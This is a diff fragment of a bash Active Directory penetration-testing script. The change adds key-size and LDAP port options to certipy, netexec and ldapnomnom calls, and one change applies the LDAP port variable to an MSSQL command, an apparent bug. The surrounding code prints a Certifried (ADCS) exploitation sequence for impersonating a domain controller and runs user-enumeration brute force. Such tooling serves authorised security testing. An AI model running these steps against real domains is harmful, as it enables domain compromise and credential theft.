                 if [ "${ldapbinding_bool}" == true ]; then ldapbinding_param="-ldap-channel-binding"; else ldapbinding_param=""; fi
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldapbinding_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" 2>&1 | tee "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt"
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldapbinding_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt"
                 if ! grep -q "Certificate object SID is" "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt"; then
                     echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
@@ -2153,7 +2159,7 @@ kerbrute_passpray() {
 
 ne_pre2k() {
     echo -e "${BLUE}[*] Pre2k Enumeration using netexec${NC}"
-    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2185,8 +2191,8 @@ ldapnomnom_enum() {
         else
             echo -e "${BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}"
             echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --port 636"; else ldaps_param=""; fi
-            run_command "${ldapnomnom} --server ${dc_ip} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${output_dir}/BruteForce/ldapnomnom_user_output_${dc_domain}.txt"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --port ${ldap_port}"; else ldaps_param=""; fi
+            run_command "${ldapnomnom} --server ${dc_ip} --port ${ldap_port} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${output_dir}/BruteForce/ldapnomnom_user_output_${dc_domain}.txt"
             if [ -s "${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" ]; then
                 echo -e ""
                 echo -e "${GREEN}[+] Printing valid accounts...${NC}"
@@ -2766,7 +2772,7 @@ mssql_enum() {
             grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
         done
         if [ -f "${target_sql}" ]; then
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -5570,7 +5576,7 @@ auth_menu() {
                 for pki_server in $pki_servers; do
                     i=$((i + 1))
                     pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
                 done
                 cd "${current_dir}" || exit
                 if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
